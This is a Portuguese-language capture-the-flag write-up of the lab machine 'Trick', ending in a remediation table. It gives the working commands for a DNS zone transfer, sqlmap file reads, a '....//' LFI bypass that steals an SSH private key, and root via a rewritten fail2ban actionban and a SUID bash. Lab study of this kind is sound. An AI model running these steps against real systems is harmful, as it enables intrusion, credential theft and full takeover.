**IP:** 10.129.36.192 | **Dificuldade:** Easy | **OS:** Linux (Debian 10) | **Autor:** Geiseric

## Resumo

Máquina Linux com DNS, SMTP, HTTP e SSH. DNS permite zone transfer expondo `preprod-payroll.trick.htb`. O sistema de payroll tem SQL Injection com privilégio FILE no MySQL, permitindo leitura do `nginx.conf` e descoberta de um segundo vHost: `preprod-marketing.trick.htb`. Este tem LFI com bypass `....//` que expõe a chave SSH privada de michael. Privesc via fail2ban: michael pertence ao grupo `security` (dono do diretório `action.d/`), pode reiniciar fail2ban como root via sudo — modificando `actionban`, qualquer ban de IP executa o comando como root.

|------|------|

| root.txt | `4d47ac93632abd1ab1485a950e219366` |

## 2. DNS — Zone Transfer (AXFR)

```bash
echo "10.129.36.192 trick.htb" | sudo tee -a /etc/hosts
dig @10.129.36.192 axfr trick.htb
```

```
preprod-payroll.trick.htb.  604800  IN  CNAME  trick.htb.
```

---

## 3. SQL Injection com FILE privilege → nginx.conf

```bash
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \
  --data="username=abc&password=abc" -p username \
  --batch --dbms=mysql \
  --file-read=/etc/nginx/sites-enabled/default
```

O nginx.conf revela o segundo vHost: `preprod-marketing.trick.htb`.

```bash
echo "10.129.36.192 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
```

---

## 4. LFI com bypass `....//`

O parâmetro `?page=` usa `include()` com um prefixo de path. O filtro que bloqueia `../` não bloqueia `....//`:

```bash
# Confirmar LFI
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd"

# Ler chave SSH privada
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa" \
  > /tmp/michael_id_rsa
chmod 600 /tmp/michael_id_rsa
```

---

## 5. Foothold — SSH como michael

```bash
ssh -i /tmp/michael_id_rsa michael@10.129.36.192
cat ~/user.txt
# 77a7cf709dd1efb9d8409bb6699e3e17
```

## 6. Escalada de Privilégios — fail2ban action.d

```bash
id
# groups=1001(michael),1002(security)

sudo -l
# (root) NOPASSWD: /etc/init.d/fail2ban restart

ls -la /etc/fail2ban/action.d/
# drwxrwx--- 2 root security ...   ← grupo security tem write no diretório
```

**Passo 1 — Injetar comando em actionban:**

```bash
sed -i 's|actionban = .*|actionban = /bin/cp /bin/bash /tmp/bash_suid \&\& /bin/chmod +s /tmp/bash_suid|' \
  /etc/fail2ban/action.d/iptables-multiport.conf

sudo /etc/init.d/fail2ban restart
```

**Passo 2 — Triggerar o ban (do host atacante via SSH com senha errada):**

```bash
for i in {1..8}; do
  sshpass -p wrongpass$RANDOM ssh -o PreferredAuthentications=password \
    michael@10.129.36.192 'exit' 2>/dev/null &
done
wait
```

fail2ban detecta as falhas e bane o IP → `actionban` executa como root → `/tmp/bash_suid` criado.

**Passo 3 — Fixar SUID e executar:**

```bash
sed -i 's|actionban = .*|actionban = chmod 4755 /tmp/bash_suid|' \
  /etc/fail2ban/action.d/iptables-multiport.conf
sudo /etc/init.d/fail2ban restart
# triggerar falhas novamente...

/tmp/bash_suid -p -c 'cat /root/root.txt'
# 4d47ac93632abd1ab1485a950e219366
```

## Diagrama

```
DNS AXFR → preprod-payroll.trick.htb
  ↓ SQLi FILE privilege → nginx.conf → preprod-marketing.trick.htb
  ↓ LFI ....// bypass → /home/michael/.ssh/id_rsa
  ↓ SSH michael → user.txt
  ↓ security group → /etc/fail2ban/action.d/ writable
  ↓ sed -i actionban + sudo fail2ban restart + SSH failures
  ↓ bash_suid → euid=0(root) → root.txt
```

## Lições Aprendidas

| Vulnerabilidade | Remediação |
|-----------------|------------|
| DNS Zone Transfer habilitado | Restringir AXFR a servidores autorizados |
| SQL Injection com FILE privilege | Input validation + menor privilégio no DB |
| LFI sem sanitização (bypass `....//`) | Whitelist de páginas; nunca usar input direto em `include()` |
| Chave SSH privada acessível via LFI | Não armazenar chaves em paths acessíveis via web |
| fail2ban action.d writable por grupo | Remover permissões de escrita do grupo no diretório de actions |
